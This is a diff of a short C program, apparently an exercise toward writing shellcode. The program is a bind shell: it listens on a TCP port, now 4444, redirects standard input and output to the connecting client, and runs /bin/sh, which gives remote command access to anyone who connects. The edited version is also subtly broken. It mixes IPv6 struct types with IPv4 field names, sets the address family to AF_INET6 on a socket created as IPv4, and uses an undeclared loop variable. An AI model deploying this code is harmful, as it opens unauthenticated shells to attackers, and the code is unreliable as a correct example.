@@ -3,37 +3,41 @@
 #include <sys/socket.h>  
 #include <netinet/in.h>  
   
-int host_sockid;    // sockfd for host  
-int client_sockid;  // sockfd for client  
-      
-struct sockaddr_in hostaddr;            // sockaddr struct  
+// sockfd for host 
+int host_sockfd;    
+
+// sockfd for client  					   
+int client_sockfd;                       
+  
+// sockaddr_in6 struct    
+struct sockaddr_in6 host_addr;              
   
 int main()  
 {  
-    // Create socket  
-    host_sockid = socket(PF_INET, SOCK_STREAM, 0);  
+    //Create socket  
+    host_sockfd = socket(PF_INET, SOCK_STREAM, 0);  
   
-    // Initialize sockaddr struct to bind socket using it  
-    hostaddr.sin_family = AF_INET;  
-    hostaddr.sin_port = htons(1337);  
-    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);  
+    //Initialize sockaddr struct to bind socket using it  
+    host_addr.sin_family = AF_INET6;  
+    host_addr.sin_port = htons(4444);  
+    host_addr.sin_addr = in6addr_any; 
   
-    // Bind socket to IP/Port in sockaddr struct  
-    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr));  
+    //Bind socket 
+    bind(host_sockfd, (struct sockaddr*) &host_addr, sizeof(host_addr));  
       
-    // Listen for incoming connections  
-    listen(host_sockid, 2);  
+    //I am listening for connections
+    listen(host_sockfd, 2);  
   
-    // Accept incoming connection, don't store data, just use the sockfd created  
-    client_sockid = accept(host_sockid, NULL, NULL);  
+    //Just accept incoming connection  
+    client_sockfd = accept(host_sockfd, NULL, NULL);  
   
-    // dup2-loop to redirect stdin(0), stdout(1) and stderr(2)
+    //Duplicate file descriptors for STDIN, STDOUT and STDERR
     for(i = 0; i <= 2; i++)
-	dup2(clientfd, i);
+       dup2(client_sockfd, i);
   
     // Execute /bin/sh  
     execve("/bin/sh", NULL, NULL);  
-    close(host_sockid);  
+    close(host_sockfd);  
       
     return 0;  
 }
